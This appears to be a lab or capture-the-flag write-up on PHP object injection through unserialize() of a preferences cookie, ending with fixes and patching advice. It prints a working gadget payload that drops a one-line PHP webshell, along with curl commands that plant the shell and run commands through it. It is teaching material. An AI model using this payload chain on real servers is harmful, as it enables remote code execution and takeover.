# PaperTrail — PHP Object Injection via `unserialize()` → RCE

| | |
|---|---|
| **Vulnerability** | PHP Object Injection (insecure `unserialize()` of attacker-controlled data) |
| **Impact** | Remote code execution |
| **Difficulty** | ★★★½ |
| **Approach** | Black-box + source review |

> **Why this lab:** CVE-2026-109619 ("PHP2Shell") is a bug in PHP's own session **unserializer**.
> This lab is the *application-level* version of the same family — insecure `unserialize()` — which
> is exploitable, teachable, and shows exactly why that CVE class hands attackers a server.

## The application

PaperTrail is an internal reporting dashboard with no login. It "remembers" your preferences by
storing them in a `prefs` cookie and restoring them on every request.

## Discovery

Decoding the `prefs` cookie from base64 reveals a **PHP serialized string**, not JSON:

```
a:2:{s:5:"theme";s:5:"light";s:7:"density";s:4:"cozy";}
```

The server restores it with:

```php
$restored = unserialize(base64_decode($_COOKIE["prefs"]));
```

`unserialize()` on attacker-controlled bytes is **PHP Object Injection**: the function doesn't just
rebuild arrays/scalars — it can **instantiate arbitrary objects** of any class defined in the app, and
their magic methods (`__wakeup()`, `__destruct()`) run automatically. Crucially, this happens **even
if the app never uses the result** — merely unserializing an object creates it, and its destructor
fires when the request ends.

## The gadget

The codebase contains a helper used by the report-export feature:

```php
class ReportExporter {
    public $path = null;
    public $data = "";
    public function __destruct() {
        if ($this->path) { file_put_contents($this->path, $this->data); }
    }
}
```

Harmless in normal use — but as a POP gadget it's perfect: an attacker-controlled `ReportExporter`
object writes **attacker-controlled `data` to an attacker-controlled `path`** when it's destroyed. A
file write to the web root with PHP content = a webshell = RCE.

## Exploitation

Craft a serialized `ReportExporter` whose destructor drops a webshell into the docroot:

```php
class ReportExporter {
    public $path = "shell.php";
    public $data = '<?php system($_GET["c"]); ?>';
}
echo base64_encode(serialize(new ReportExporter()));
```

Serialized form:
```
O:14:"ReportExporter":2:{s:4:"path";s:9:"shell.php";s:4:"data";s:28:"<?php system($_GET["c"]); ?>";}
```

Deliver it as the `prefs` cookie, then collect:

```bash
# 1) send the payload — unserialize() instantiates ReportExporter; __destruct() writes shell.php
curl -s 'http://localhost:9008/' -H "Cookie: prefs=<base64-payload>" >/dev/null

# 2) the webshell now exists in the web root — RCE
curl -s 'http://localhost:9008/shell.php?c=cat%20/flag.txt'
```
```
FLAG{php_0bj3ct_1nj3ct10n_un5er14l1z3_t0_rc3}
```

## Root-cause fix

Filtering the serialized string is a losing game (encodings, gadget variety). The root cause is
**`unserialize()` on untrusted input** — remove it:

- **Use JSON, not PHP serialization, for untrusted data.** `json_decode()` can only ever produce
  arrays/scalars — it can never instantiate an object, so object injection becomes impossible. Prefs
  are plain key/value data, so JSON is the natural fit.
- If serialization is unavoidable, pass `unserialize($s, ['allowed_classes' => false])` (PHP 7+) so no
  object is ever constructed.
- **Sign the cookie with an HMAC** (`hash_hmac`) and verify before use — then a tampered cookie is
  rejected outright (defense in depth), and still validate against an allow-list of keys/values.

See `app_fixed.php` — signed-JSON cookie, allow-listed keys, no `unserialize`.

## Staying current — the PHP2Shell link

This box runs **PHP 8.2.10**, which is vulnerable to PHP2Shell (fixed in **8.2.35**). Two different
layers, same family:
- *Application* object injection (this lab): your code calls `unserialize()` on user data → fix the code.
- *Engine* unserializer bug (PHP2Shell): the flaw is in PHP itself → **patch PHP** (`.ini`/WAF tweaks
  are not remediation). Check with `php -v`, upgrade to the fixed release, verify.

## Key lesson

Same principle as every injection class: **never let untrusted input become code.** `unserialize()`
turns bytes into live objects (code paths); keep untrusted state as inert **data** (JSON), signed so
it can't be tampered with at all.
